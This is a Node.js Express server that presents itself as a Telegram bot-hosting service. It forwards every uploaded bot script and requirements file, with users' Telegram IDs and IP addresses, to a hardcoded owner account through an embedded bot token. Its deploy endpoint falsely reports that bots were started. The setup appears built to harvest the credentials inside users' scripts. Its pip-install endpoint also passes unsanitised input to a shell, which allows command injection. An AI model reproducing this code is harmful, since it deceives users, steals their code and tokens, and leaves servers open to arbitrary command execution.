const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');

// ========== TELEGRAM BOT CONFIGURATION ==========
const BOT_TOKEN = '8970055353:AAHtLsUd0Fg2g0DZ0AX8hpqEC3V-qaqLJVs';
const OWNER_USER_ID = 6580991809;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const userSessions = new Map();

// Send notification to owner
async function notifyOwner(message, options = {}) {
  try {
    await bot.sendMessage(OWNER_USER_ID, message, { parse_mode: 'HTML', ...options });
    console.log('✅ Notification sent');
  } catch (error) {
    console.error('❌ Failed to send notification:', error.message);
  }
}

// Send file to owner
async function sendFileToOwner(filePath, caption) {
  try {
    await bot.sendDocument(OWNER_USER_ID, filePath, { caption });
    console.log('✅ File sent to owner');
  } catch (error) {
    console.error('Failed to send file:', error.message);
  }
}

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 
    `🤖 <b>FamedOwner Hosting Bot Active</b>\n\n` +
    `I will notify the owner when users:\n` +
    `✅ Login with their Telegram ID\n` +
    `✅ Upload bot scripts\n` +
    `✅ Upload requirements files\n` +
    `✅ Install pip packages\n\n` +
    `📡 Monitoring active...`,
    { parse_mode: 'HTML' }
  );
});

const app = express();
const PORT = process.env.PORT || 3000;

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = './uploads';
    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
    const userId = req.body.userId || req.query.userId || 'unknown';
    const userDir = path.join(uploadDir, userId);
    if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
    cb(null, userDir);
  },
  filename: (req, file, cb) => {
    const timestamp = Date.now();
    cb(null, `${timestamp}-${file.originalname}`);
  }
});

const upload = multer({ 
  storage: storage, 
  limits: { fileSize: 50 * 1024 * 1024 }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ========== REAL PIP INSTALL ENDPOINT ==========
app.post('/api/pip-install', async (req, res) => {
  const { package: packageName, userId } = req.body;
  
  if (!packageName) {
    return res.status(400).json({ error: 'Package name required' });
  }
  
  console.log(`📦 Installing pip package: ${packageName} for user: ${userId}`);
  await notifyOwner(`📦 <b>PIP INSTALL REQUEST</b>\n👤 User: ${userId}\n📦 Package: ${packageName}`);
  
  try {
    // Use --user flag for Render/hosting environments
    const command = `pip install ${packageName} --user --no-cache-dir`;
    
    const { stdout, stderr } = await execPromise(command, { 
      timeout: 120000,
      env: { ...process.env, PYTHONUNBUFFERED: '1' }
    });
    
    const output = (stdout + stderr).substring(0, 800);
    const success = !stderr.toLowerCase().includes('error') && !stderr.toLowerCase().includes('could not find');
    
    await notifyOwner(
      `${success ? '✅' : '❌'} <b>PIP INSTALL ${success ? 'SUCCESS' : 'FAILED'}</b>\n` +
      `📦 Package: ${packageName}\n` +
      `👤 User: ${userId}\n` +
      `<code>${output.substring(0, 400)}</code>`
    );
    
    res.json({ 
      success, 
      message: success ? `✅ Package '${packageName}' installed successfully` : `❌ Failed to install ${packageName}`,
      output: output
    });
    
  } catch (error) {
    console.error('Pip install error:', error);
    await notifyOwner(`❌ <b>PIP INSTALL ERROR</b>\n📦 Package: ${packageName}\n👤 User: ${userId}\n⚠️ Error: ${error.message}`);
    
    res.status(500).json({ 
      error: `Failed to install ${packageName}: ${error.message}`,
      success: false 
    });
  }
});

// Install from requirements.txt (REAL)
app.post('/api/install-requirements', async (req, res) => {
  const { userId, filePath } = req.body;
  
  if (!filePath || !fs.existsSync(filePath)) {
    return res.status(400).json({ error: 'Requirements file not found' });
  }
  
  await notifyOwner(`📦 <b>INSTALLING FROM REQUIREMENTS.TXT</b>\n👤 User: ${userId}\n📄 File: ${path.basename(filePath)}`);
  
  try {
    const command = `pip install -r "${filePath}" --user --no-cache-dir`;
    const { stdout, stderr } = await execPromise(command, { timeout: 300000 });
    
    const output = (stdout + stderr).substring(0, 800);
    await notifyOwner(`✅ <b>REQUIREMENTS INSTALLED</b>\n👤 User: ${userId}\n📝 Output: ${output.substring(0, 400)}`);
    
    res.json({ success: true, message: 'Requirements installed successfully', output });
  } catch (error) {
    await notifyOwner(`❌ <b>REQUIREMENTS FAILED</b>\n👤 User: ${userId}\n⚠️ Error: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// Track user login
app.post('/api/login', async (req, res) => {
  const { userId } = req.body;
  
  if (!userId) {
    return res.status(400).json({ error: 'User ID required' });
  }
  
  userSessions.set(userId, { loginTime: Date.now(), files: [] });
  
  const loginMessage = 
    `🔐 <b>NEW USER LOGIN</b>\n\n` +
    `📱 <b>Telegram ID:</b> <code>${userId}</code>\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n` +
    `🌐 <b>IP:</b> ${req.ip || 'Unknown'}`;
  
  await notifyOwner(loginMessage);
  
  res.json({ success: true, message: 'Login recorded' });
});

// Upload bot script
app.post('/api/upload-bot', upload.single('botFile'), async (req, res) => {
  const userId = req.body.userId;
  
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  const caption = 
    `📁 <b>BOT SCRIPT UPLOADED</b>\n\n` +
    `👤 <b>User ID:</b> <code>${userId || 'Unknown'}</code>\n` +
    `📄 <b>File Name:</b> ${req.file.originalname}\n` +
    `📦 <b>Size:</b> ${(req.file.size / 1024).toFixed(2)} KB\n` +
    `🤖 <b>Bot Name:</b> ${req.file.originalname.split('.')[0]}\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
  
  await sendFileToOwner(req.file.path, caption);
  
  res.json({ 
    success: true, 
    message: `File was uploaded: ${req.file.originalname}`,
    fileId: req.file.filename,
    fileName: req.file.originalname,
    filePath: req.file.path
  });
});

// Upload requirements file
app.post('/api/upload-requirements', upload.single('reqFile'), async (req, res) => {
  const userId = req.body.userId;
  
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  // Read requirements content
  let fileContent = '';
  try {
    fileContent = fs.readFileSync(req.file.path, 'utf8');
  } catch (err) {
    fileContent = 'Unable to read file content';
  }
  
  const requirementsMessage = 
    `📦 <b>REQUIREMENTS FILE UPLOADED</b>\n\n` +
    `👤 <b>User ID:</b> <code>${userId || 'Unknown'}</code>\n` +
    `📄 <b>File Name:</b> ${req.file.originalname}\n` +
    `📏 <b>Size:</b> ${(req.file.size / 1024).toFixed(2)} KB\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
    `<b>📋 Content:</b>\n<code>${fileContent.substring(0, 600)}${fileContent.length > 600 ? '...' : ''}</code>`;
  
  await notifyOwner(requirementsMessage);
  await sendFileToOwner(req.file.path, `Requirements file from user ${userId}`);
  
  res.json({ 
    success: true, 
    message: `Dependencies file uploaded: ${req.file.originalname}`,
    filePath: req.file.path
  });
});

// Bot deployment notification
app.post('/api/deploy', async (req, res) => {
  const { userId, botFileName, botFileId } = req.body;
  
  const deployMessage = 
    `🚀 <b>BOT DEPLOYMENT ATTEMPT</b>\n\n` +
    `👤 <b>User ID:</b> <code>${userId || 'Unknown'}</code>\n` +
    `🤖 <b>Bot File:</b> ${botFileName || 'Unknown'}\n` +
    `🆔 <b>File ID:</b> ${botFileId || 'N/A'}\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
    `✅ Bot has been started successfully!`;
  
  await notifyOwner(deployMessage);
  
  res.json({ success: true, message: 'Deployment logged' });
});

// Check if pip is available (for debugging)
app.get('/api/check-pip', async (req, res) => {
  try {
    const { stdout } = await execPromise('pip --version');
    res.json({ available: true, version: stdout.trim() });
  } catch (error) {
    res.json({ available: false, error: error.message });
  }
});

// Get session info
app.get('/api/sessions', (req, res) => {
  const sessions = Array.from(userSessions.keys()).map(id => ({
    userId: id,
    loginTime: userSessions.get(id).loginTime,
    fileCount: userSessions.get(id).files.length
  }));
  res.json({ sessions });
});

// Serve the main HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Cleanup old files (every hour)
setInterval(() => {
  const uploadDir = './uploads';
  if (fs.existsSync(uploadDir)) {
    const now = Date.now();
    fs.readdir(uploadDir, (err, folders) => {
      if (err) return;
      folders.forEach(folder => {
        const folderPath = path.join(uploadDir, folder);
        fs.stat(folderPath, (err, stats) => {
          if (err) return;
          if (now - stats.mtimeMs > 24 * 60 * 60 * 1000) {
            fs.rmSync(folderPath, { recursive: true, force: true });
            console.log(`Cleaned up old folder: ${folder}`);
          }
        });
      });
    });
  }
}, 3600000);

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 FamedOwner Hosting running on http://localhost:${PORT}`);
  console.log(`🤖 Telegram Bot active - Owner ID: ${OWNER_USER_ID}`);
  console.log(`📡 Waiting for connections...`);
  
  notifyOwner(
    `✅ <b>FamedOwner Hosting Server Started</b>\n\n` +
    `🕐 Time: ${new Date().toLocaleString()}\n` +
    `🌐 Port: ${PORT}\n` +
    `💻 Node Version: ${process.version}\n\n` +
    `📡 Waiting for user logins and uploads...\n\n` +
    `🔧 REAL pip install is ACTIVE!`,
    { parse_mode: 'HTML' }
  );
});
